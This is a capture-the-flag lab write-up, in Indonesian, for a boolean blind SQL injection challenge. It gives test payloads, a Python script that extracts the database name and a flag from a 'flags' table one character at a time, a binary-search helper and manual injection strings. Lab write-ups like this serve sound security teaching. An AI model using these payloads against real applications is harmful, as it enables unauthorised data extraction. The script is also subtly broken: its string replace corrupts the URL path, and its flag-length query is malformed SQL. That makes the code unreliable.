# Lab M1 - Boolean Blind SQL Injection (Medium)

## Informasi Lab
- **Endpoint**: `/report.php?id=`
- **Tipe**: Boolean Blind Injection
- **Hint**: Timing text - No error displayed

## Analisis

### 1. Karakteristik Blind SQLi
- Tidak ada error yang ditampilkan
- Tidak ada data yang di-output langsung
- Hanya ada perbedaan response (ada data / tidak ada data)

### 2. Test Boolean Conditions
```
?id=1 AND 1=1   (True - data muncul)
?id=1 AND 1=2   (False - data tidak muncul)
```

## Solusi

### Script Python untuk Automasi

```python
import requests

url = "http://localhost/m1/report.php?id=1"

def check(condition):
    payload = f"1 AND ({condition})"
    r = requests.get(url.replace("1", payload))
    return "Report not found" not in r.text

# Get database length
db_len = 0
for i in range(1, 50):
    if check(f"LENGTH(database())={i}"):
        db_len = i
        break
print(f"Database name length: {db_len}")

# Get database name
db_name = ""
for i in range(1, db_len + 1):
    for c in "abcdefghijklmnopqrstuvwxyz0123456789":
        if check(f"ASCII(SUBSTRING(database(),{i},1))={ord(c)}"):
            db_name += c
            break
print(f"Database name: {db_name}")

# Get flag length
flag_len = 0
for i in range(1, 100):
    if check(f"SELECT LENGTH(flag) FROM flags LIMIT 1={i}"):
        flag_len = i
        break
print(f"Flag length: {flag_len}")

# Get flag
flag = ""
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}IDS"
for i in range(1, flag_len + 1):
    for c in charset:
        if check(f"ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),{i},1))={ord(c)}"):
            flag += c
            print(f"Flag: {flag}")
            break

print(f"\nFinal Flag: {flag}")
```

### Manual Method (Binary Search)

```python
def binary_search_char(position, query):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

### Payload Manual
```
# Test karakter pertama flag
?id=1 AND ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1))>64
?id=1 AND ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1))=73
```
Jika true, karakter pertama adalah 'I' (ASCII 73).

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Gunakan binary search untuk efisiensi
- Blind injection membutuhkan banyak request
- Gunakan script untuk automasi
